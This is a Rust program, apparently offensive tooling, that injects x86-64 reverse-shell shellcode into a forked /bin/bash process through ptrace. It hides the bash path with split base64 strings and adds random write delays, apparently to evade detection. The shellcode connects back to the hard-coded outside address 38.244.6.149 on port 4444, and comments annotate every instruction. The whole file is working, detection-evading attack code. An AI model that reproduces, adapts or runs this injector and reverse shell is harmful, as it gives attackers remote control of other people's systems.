use std::ffi::{c_void, CStr, CString};
use std::net::Ipv4Addr;
use base64::{Engine as _, engine::general_purpose};
use nix::{sys::{ptrace::{detach, getregs, traceme, write, AddressType}, wait::waitpid}, unistd::{execv, fork, ForkResult}};
use rand::Rng;

// Reverse shell Shellcode on 4444
// ; 系统调用号41 (0x29) -> socket()
// 6A 29       push 0x29                ; 将41压栈
// 58          pop rax                  ; rax = 41 (sys_socket)
// 99          cdq                      ; 清空rdx (参数3=0)

// ; 设置socket参数
// 6A 02       push 0x2                 ; AF_INET (IPv4)
// 5F          pop rdi                  ; rdi = 2
// 6A 01       push 0x1                 ; SOCK_STREAM (TCP)
// 5E          pop rsi                  ; rsi = 1
// 0F 05       syscall                  ; 调用socket()

// ; 保存socket fd到rdi
// 48 97       xchg rdi, rax           ; rdi = socket_fd

// ; 构建sockaddr_in结构 (127.0.0.1:4444)
// 48 B9 02 00 11 5C 7F 00 00 01 
// mov rcx, 0x100007f5c110002        ; rc x= [AF_INET=2, PORT=4444, IP=127.0.0.1]
// 51          push rcx               ; 结构体压栈
// 48 89 E6    mov rsi, rsp           ; rsi -> sockaddr结构

// ; 调用connect()
// 6A 10       push 0x10              ; addrlen=16
// 5A          pop rdx                ; rdx = 16
// 6A 2A       push 0x2a              ; 系统调用42 (sys_connect)
// 58          pop rax                ; rax = 42
// 0F 05       syscall                ; 执行connect()

// ; 循环复制文件描述符(stdin/stdout/stderr)
// 6A 03       push 0x3               ; 计数器初始为3
// 5E          pop rsi                ; rsi = 3
// loop:
// 48 FF CE    dec rsi                ; rsi--
// 6A 21       push 0x21              ; 系统调用33 (sys_dup2)
// 58          pop rax                ; rax = 33
// 0F 05       syscall                ; dup2(socket_fd, rsi)
// 75 F6       jnz loop               ; 循环直到rsi=0

// ; 调用execve("/bin/sh")
// 6A 3B       push 0x3b              ; 系统调用59 (sys_execve)
// 58          pop rax                ; rax = 59
// 99          cdq                    ; rdx = 0 (envp=NULL)

// ; 构建"/bin/sh"字符串
// 48 BB 2F 62 69 6E 2F 73 68 00 
// mov rbx, 0x0068732f6e69622f      ; "/bin/sh\x00"
// 53          push rbx               ; 字符串压栈
// 48 89 E7    mov rdi, rsp           ; rdi -> "/bin/sh"

// ; 设置argv
// 52          push rdx               ; NULL
// 57          push rdi               ; 保存字符串地址
// 48 89 E6    mov rsi, rsp           ; rsi = ["/bin/sh", NULL]
// 0F 05       syscall                ; execve()


pub fn generate_reverse_shell(ip: &str, port: u16) -> Vec<u8> {
    let ip_addr: Ipv4Addr = ip.parse().expect("Invalid IPv4 address");
    let port_bytes = port.to_be_bytes();
    let ip_bytes = ip_addr.octets();
    
    let sockaddr_bytes: [u8; 8] = [
        0x02, 0x00,
        port_bytes[0], port_bytes[1],
        ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]
    ];

    let mut shellcode = vec![
        0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 
        0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48, 0xB9,
    ];
    shellcode.extend_from_slice(&sockaddr_bytes);
    shellcode.extend([
        0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A, 
        0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 
        0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75, 
        0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x48, 0xBB, 0x2F, 
        0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 
        0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 
        0x0F, 0x05,
    ]);

    shellcode
}

fn main() {
    let fork_result = unsafe { fork().expect("Failed to fork") };

    match fork_result {

        ForkResult::Parent { child } => {

            // Wait signal for ptrace manipulation
            waitpid(child, None).expect("Failed to wait");

            // Getting register for child process
            let mut rip = getregs(child).expect("Could not get child's registers").rip as u64;

            // Writing Shellcode to Process RIP registerdGKCXUXhD8Rixp7M
            let shellcode = generate_reverse_shell("38.244.6.149", 4444);

            // Use a random number generator
            let mut rng = rand::rng();

            // Write shellcode to the child process memory
            for chunk in shellcode.chunks(8) {
                for byte in chunk {
                    unsafe { write(child, rip as AddressType, *byte as *mut c_void).unwrap(); }
                    rip += 1;
                }

            // Add random delay
            unsafe { libc::usleep((rng.random_range(0..100)) as u32); }
            }
            
            // Detach with no signal from the process to resume execution
            detach(child, None).expect("Failed to detach");
        }

        ForkResult::Child => {
            // Indicates that this process is traceable 
            traceme().expect("Failed to call traceme in child");

            // Replace current process with a new one. ("/bin/bash")
            // L2Jpbi9iYXNo
            let bin1_path = ("L2J").chars();
            let bin2_path = ("pbi").chars();
            let bin3_path = ("9iY").chars();
            let bin4_path = ("XNo").chars();
            let path = bin1_path.chain(bin2_path).chain(bin3_path).chain(bin4_path).collect::<String>();
            let path = general_purpose::STANDARD.decode(path).expect("Base64 decode failed");
            let path = CString::new(path).expect("CString::new failed");
            let argument: &[&CStr; 0] = &[];
            execv(&path, argument).unwrap();
            unreachable!("Execv should have replaced the program")
        }
    }
}